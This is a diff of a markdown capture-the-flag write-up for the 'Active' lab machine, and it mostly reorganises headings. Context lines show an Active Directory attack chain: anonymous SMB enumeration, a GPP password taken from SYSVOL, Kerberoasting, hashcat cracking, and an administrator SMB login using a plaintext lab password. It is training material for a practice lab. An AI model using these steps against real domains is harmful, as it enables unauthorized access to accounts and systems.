@@ -10,9 +10,9 @@ excerpt: "Active is a relatively straightforward machine, perfect for getting s
 ![img-description](/assets/images/active_test1.png)
 
 **Active** is a relatively straightforward machine, perfect for getting started with **Active Directory**. In this machine, we'll explore techniques like **Kerberoasting** and **GPP Passwords**, two common methods for privilege escalation in AD environments. Great for practicing and understanding key concepts! 🚀
-# **ENUMERATION**
+## **ENUMERATION**
 ----
-## NMAP SCANNING
+### Nmap scanning
 ----
 We start using nmap:
 ````bash 
@@ -64,7 +64,7 @@ Host script results:
 ````
 After analyzing the nmap, we can realize that we are dealing with an Active Directory, so we will start by enumerating the SMB.
 
-# **ENUMERATING SMB AS ANONYMOUS**
+### Enumerating smb as anonymous
 ----
 ````bash
 smbclient -L \\\10.10.10.100/shares
@@ -82,7 +82,7 @@ Anonymous login successful
 	Users           Disk      
 ````
 
-## On smb we found credentails for SVC_TGS
+### On smb we found credentails for SVC_TGS
 ---
 ````bash
 smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> ls
@@ -95,17 +95,15 @@ smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Prefere
 </Groups>
 ````
 
-# **FOOTHOLD**
+## **FOOTHOLD**
 ----
-## Group Policy Preferences
+### Group Policy Preferences
 
 When a new Group Policy Preference (GPP) is created, an XML file is stored in the SYSVOL share containing its configuration, including any associated passwords. These passwords are AES-encrypted and stored as `cpassword`. However, Microsoft publicly [released the encryption key](https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx).
 
 In 2014, Microsoft patched this by preventing admins from adding passwords to GPP, but it didn’t address existing vulnerable passwords. As of 2025, pentesters still find these issues. For more details, see this [AD Security post](https://adsecurity.org/?p=2288).
 
-# **AUTHENTICATED ENUMERATION**
----
-## Enumerating SMB as SVC_TGS
+### Enumerating SMB as SVC_TGS
 ----
 
 ````bash
@@ -118,9 +116,9 @@ smb: \SVC_TGS\Desktop\> ls
 
                 5217023 blocks of size 4096. 260447 blocks available
 ````
-# **PRIVILEGE ESCALATION**
+## **PRIVILEGE ESCALATION**
 ----
-## Kerberoasting
+### Kerberoasting
 ----
 Kerberos is an authentication protocol used in Windows Active Directory environments (and can also be used for Linux hosts). In 2014, Tim Medin introduced the _Kerberoasting_ attack. This attack involves obtaining Kerberos tickets encrypted with the hash of a service account's password. Instead of sending the ticket to the service, it can be brute-forced offline to crack the password.
 
@@ -142,8 +140,8 @@ We were able to extrat the ticket which we will try to force decrypt to get Admi
 hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force
 ````
 
-## Acces as ADMINISTRATOR to smb
-
+## LOGIN AS ADMINISTRATOR
+---
 ````bash
 smbclient //10.10.10.100/C$ -U active.htb\\administrator%Ticketmaster1968
 
